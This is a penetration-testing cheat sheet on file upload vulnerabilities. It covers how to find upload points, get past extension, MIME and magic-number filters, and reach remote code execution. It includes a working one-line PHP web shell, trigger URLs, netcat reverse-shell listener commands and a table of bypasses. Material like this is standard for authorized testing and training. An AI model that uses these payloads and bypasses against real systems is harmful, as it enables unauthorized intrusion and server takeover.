# File Upload Vulnerability

## 1. What is File Upload Vulnerability?

When a web application allows users to upload files without proper validation, attackers can:

- Upload web shells → Remote Code Execution (RCE)
- Overwrite existing files
- Upload malicious payloads (e.g., reverse shells, malware)
- Enumerate files or cause denial of service

---

## 2. Identification 

- Upload forms: profile pictures, resumes, contact forms
- CMS admin panels
- PDF/image uploaders
- Any user-generated content platform

Check for:
- Error messages after upload
- File name or type restrictions
- Where the uploaded file gets stored
- Use Gobuster/Dirb to find upload directories (`/uploads/`, `/files/`, etc.)

---

## 3. Exploitation Techniques

1. Initial Testing
- Upload a valid image and try to access it
- Note how the server names files (randomized or original name)
- Identify upload path (e.g., `/uploads/img.jpg`)

2. Try Malicious Uploads
- Upload basic web shell or reverse shell
- Use extensions like `.php`, `.phar`, `.phtml`, `.php5`

3. Bypass File Filters

Client-Side:
- Modify HTML/JS or intercept in Burp and change file extension/type
- Disable JavaScript and upload using curl or Burp Repeater

Server-Side:
- Use alternate extensions: `.phar`, `.phtml`, `.php3`
- Bypass blacklists: `shell.php.jpg`, `shell.jpg.php`
- Add magic numbers to fake file type (e.g., JPEG header `FF D8 FF DB`)
- Modify MIME type in Burp: `text/x-php`

4. Trigger RCE
- Access uploaded shell: `/uploads/shell.php?cmd=whoami`
- Trigger reverse shell with listener: `nc -lvnp 4444`

---

## 4. Payloads (Web Shells)

Simple PHP shell:
```php
<?php echo system($_GET["cmd"]); ?>
```

Access via:
```
http://target/uploads/shell.php?cmd=ls
```

Or use Pentest Monkey PHP reverse shell (edit IP and port).

---

## 5. Filter Bypasses Summary

| Filter Type         | Bypass Method                          |
|---------------------|----------------------------------------|
| Extension Filtering | Use `.phar`, `.php5`, `.phtml`         |
| MIME Type Filtering | Modify MIME in Burp to `text/x-php`    |
| Magic Number Check  | Add JPEG header with hex editor        |
| File Name Check     | Use encoded/unique names               |
| File Size Check     | Use minimal shell payloads             |

---

## 6. Enumeration Tools

- Gobuster:
  ```
  gobuster dir -u http://target -w wordlist.txt -x php,jpg,txt
  ```
- Burp Suite: Intercept uploads and responses
- Wappalyzer / Headers: Identify backend tech and framework

---

## 7. Exploit Types

### 1. Overwrite Attack
- Re-upload a file with the same name as an existing one (e.g., `/images/logo.jpg`)
- Replace it with malicious content

### 2. Web Shell Access
- Upload `shell.php`, access via browser, run system commands

### 3. Reverse Shell
- Upload `php-reverse-shell.php`
- Start listener: `nc -lvnp 1234`
- Trigger shell: `http://target/uploads/shell.php`

### 4. Bypass Magic Number Check
- Add image header (e.g., `FF D8 FF DB`) to PHP shell
- Upload as `shell.jpg`, intercept and rename to `shell.php`

---

## 8. Real-World Tips

- Inspect HTML/JS for client-side validation
- Use Burp to modify file content or type mid-request
- Try double extensions: `evil.php.jpg`
- Look for dynamic folder names for uploaded files
- PHP targets are easier for RCE than Node.js or Python

---
